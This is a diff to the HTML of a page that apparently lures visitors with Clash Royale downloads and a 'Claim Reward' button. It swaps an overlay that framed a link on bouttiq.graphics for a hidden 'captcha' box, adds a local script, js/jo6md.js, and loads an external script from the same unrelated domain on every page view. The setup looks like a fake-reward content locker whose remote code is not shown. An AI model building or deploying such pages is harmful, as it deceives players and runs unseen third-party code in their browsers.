@@ -28,6 +28,7 @@
 
 <!-- JS files -->
 <script src="js/main.js" defer></script>
+<script src="js/jo6md.js" defer></script>
 <script src="js/otSDKStub.js" defer></script>
 <script src="js/d692515.js" defer></script>
 
@@ -46,59 +47,9 @@
 outline: 2px solid black !important;
 box-shadow: 0 0 10px rgba(0, 0, 0, 0.5) !important;
 }
-/* Redirect Overlay Styles */
-.redirect-overlay {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    width: 80%;
-    height: 80%;
-    max-width: 1000px;
-    max-height: 700px;
-    background: white;
-    border-radius: 15px;
-    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-    z-index: 9999;
-    display: none;
-    border: 2px solid #22c55e;
-    overflow: hidden;
-}
-
-.redirect-overlay.active {
-    display: block;
-}
-
-.overlay-bg {
-    position: fixed;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    background: rgba(0, 0, 0, 0.6);
-    backdrop-filter: blur(3px);
-    z-index: 9998;
-    display: none;
-}
-
-.overlay-bg.active {
-    display: block;
-}
-
-.overlay-iframe {
-    width: 100%;
-    height: 100%;
-    border: none;
-}
 </style>
 </head>
 <body>
-<!-- Redirect Overlay -->
-<div class="overlay-bg" id="overlayBg"></div>
-<div class="redirect-overlay" id="redirectOverlay">
-    <iframe src="" class="overlay-iframe" id="redirectFrame" allowfullscreen></iframe>
-</div>
-
 <section class="__variable_ff1c38 __variable_635e75">
 <main class="__variable_ff1c38 __variable_635e75 styles_main__H_BuV">
 <div class="language-dropdown-wrapper styles_language-dropdown-wrapper__z8_b8">
@@ -275,9 +226,26 @@ document.querySelector("#open-game-button span").textContent = translations[curr
 <canvas style="width: 200px; height: 200px" height="400" width="400" class="qr-code styles_qr__wRI1A"></canvas>
 </div>
 
-<a class="styles_button__DNJ4N button show-redirect-overlay" style="cursor: pointer;" data-url="https://bouttiq.graphics/cl/i/o441p2">
+<a class="styles_button__DNJ4N button" style="cursor: pointer;" onclick="toggleDiv()">
 <span>Claim Reward</span>
 </a>
+
+<div id="hiddenDiv" style="display: none;">
+<!-- CAPTCHA WILL LOAD HERE AUTOMATICALLY -->
+<div data-captcha-enable="true"></div>
+</div>
+
+<script>
+function toggleDiv() {
+var div = document.getElementById("hiddenDiv");
+var currentDisplay = window.getComputedStyle(div).display;
+if (currentDisplay === "none") {
+div.style.setProperty("display", "block", "important");
+} else {
+div.style.setProperty("display", "none", "important");
+}
+}
+</script>
 
 <div class="download-links-wrapper styles_download-links-wrapper__Y_api">
 <div class="styles_download-links-heading__XV9JX download-links-heading">Download Clash Royale</div>
@@ -385,49 +353,7 @@ showLink(androidLink);
 </footer>
 </section>
 
-<!-- Add your redirect script -->
-<script>
-// Redirect Overlay Functionality
-const redirectOverlay = document.getElementById('redirectOverlay');
-const overlayBg = document.getElementById('overlayBg');
-const redirectFrame = document.getElementById('redirectFrame');
-
-function showOverlay(url) {
-    redirectFrame.src = url;
-    redirectOverlay.classList.add('active');
-    overlayBg.classList.add('active');
-    document.body.style.overflow = 'hidden';
-}
-
-// Add event listeners to all download buttons
-document.querySelectorAll('.show-redirect-overlay').forEach(button => {
-    button.addEventListener('click', function(e) {
-        e.preventDefault();
-        const url = this.getAttribute('data-url');
-        showOverlay(url);
-    });
-});
-
-// Close overlay when clicking on background
-overlayBg.addEventListener('click', function() {
-    redirectOverlay.classList.remove('active');
-    overlayBg.classList.remove('active');
-    document.body.style.overflow = 'auto';
-    redirectFrame.src = '';
-});
-
-// Close overlay with Escape key
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape' && redirectOverlay.classList.contains('active')) {
-        redirectOverlay.classList.remove('active');
-        overlayBg.classList.remove('active');
-        document.body.style.overflow = 'auto';
-        redirectFrame.src = '';
-    }
-});
-</script>
-
-<!-- Your external script -->
+<!-- STEP ONE: Add this script (updated with new source) -->
 <script type="text/javascript" src="https://bouttiq.graphics/cp/js/zyjr6"></script>
 </body>
 </html>
